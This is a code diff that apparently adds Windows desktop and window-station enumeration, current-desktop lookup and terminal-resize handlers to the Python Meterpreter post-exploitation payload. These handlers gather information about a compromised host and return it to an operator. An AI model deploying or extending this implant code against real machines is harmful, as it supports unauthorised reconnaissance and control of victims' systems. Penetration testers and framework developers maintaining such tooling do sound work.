+        entry += tlv_pack(TLV_TYPE_DESKTOP_SESSION, session_id)
+        entry += tlv_pack(TLV_TYPE_DESKTOP_STATION, station_name)
+        entry += tlv_pack(TLV_TYPE_DESKTOP_NAME, lpszDesktop.decode())
+
+        response_parts.append(tlv_pack(TLV_TYPE_DESKTOP, entry))
+
+        return True
+
+    @WINSTAENUMPROCA
+    def desktop_enumstations_callback(lpszWindowStation, lParam):
+        hWindowStation = OpenWindowStationA(lpszWindowStation, False, MAXIMUM_ALLOWED)
+        if not hWindowStation:
+            return True
+
+        callback = functools.partial(desktop_enumdesktops_callback, response_parts)
+        session_id = get_session_id(GetCurrentProcessId()).value
+        station_name = lpszWindowStation.decode()
+        callback = functools.partial(desktop_enumdesktops_callback, response_parts, session_id, station_name)
+        callback = DESKTOPENUMPROCA(callback)
+        EnumDesktopsA(hWindowStation, callback, 0)
+
+        if hWindowStation:
+            CloseWindowStation(hWindowStation)
+
+        return True
+
+    success = EnumWindowStationsA(desktop_enumstations_callback, 0)
+    if not success:
+        return error_result_windows(), response
+
+    response += bytes().join(response_parts)
+
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_ui_desktop_get(request, response):
+    UOI_NAME = 2
+
+    GetCurrentProcessId = ctypes.windll.kernel32.GetCurrentProcessId
+    GetCurrentProcessId.restype = ctypes.c_ulong
+
+    GetProcessWindowStation = ctypes.windll.user32.GetProcessWindowStation
+    GetProcessWindowStation.restype = ctypes.c_void_p
+
+    GetUserObjectInformationA = ctypes.windll.user32.GetUserObjectInformationA
+    GetUserObjectInformationA.argtypes = [ctypes.c_void_p, ctypes.c_int32, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
+    GetUserObjectInformationA.restype = ctypes.c_bool
+
+    GetCurrentThreadId = ctypes.windll.kernel32.GetCurrentThreadId
+    GetCurrentThreadId.restype = ctypes.c_ulong
+
+    GetThreadDesktop = ctypes.windll.user32.GetThreadDesktop
+    GetThreadDesktop.argtypes = [ctypes.c_ulong]
+    GetThreadDesktop.restype = ctypes.c_void_p
+
+    ProcessIdToSessionId = ctypes.windll.kernel32.ProcessIdToSessionId
+    ProcessIdToSessionId.argtypes = [ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
+    ProcessIdToSessionId.restype = ctypes.c_bool
+
+    dwSessionId = ctypes.c_ulong(0)
+    if not ProcessIdToSessionId(GetCurrentProcessId(), ctypes.byref(dwSessionId)):
+        return error_result_windows(), response
+
+    station_name = ctypes.create_string_buffer(bytes(), 256)
+    success = GetUserObjectInformationA(GetProcessWindowStation(), UOI_NAME, ctypes.byref(station_name), 256, None)
+    if not success:
+        return error_result_windows(), response
+
+    desktop_name = ctypes.create_string_buffer(bytes(), 256)
+    success = GetUserObjectInformationA(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, ctypes.byref(desktop_name), 256, None)
+    if not success:
+        return error_result_windows(), response
+
+    response += tlv_pack(TLV_TYPE_DESKTOP_SESSION, dwSessionId.value)
+    response += tlv_pack(TLV_TYPE_DESKTOP_STATION, station_name.value.decode())
+    response += tlv_pack(TLV_TYPE_DESKTOP_NAME, desktop_name.value.decode())
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_termios and has_fcntl)
+def stdapi_sys_process_set_term_size(request, response):
+    channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
+    rows = packet_get_tlv(request, TLV_TYPE_TERMINAL_ROWS)['value']
+    columns = packet_get_tlv(request, TLV_TYPE_TERMINAL_COLUMNS)['value']
+    if channel_id in meterpreter.interact_channels:
+        proc_h = meterpreter.channels[channel_id].proc_h
+        winsize = struct.pack("HHHH", rows, columns, 0, 0)
+        fcntl.ioctl(proc_h.stdin, termios.TIOCSWINSZ, winsize)
+    else:
+        return ERROR_FAILURE, response
     return ERROR_SUCCESS, response
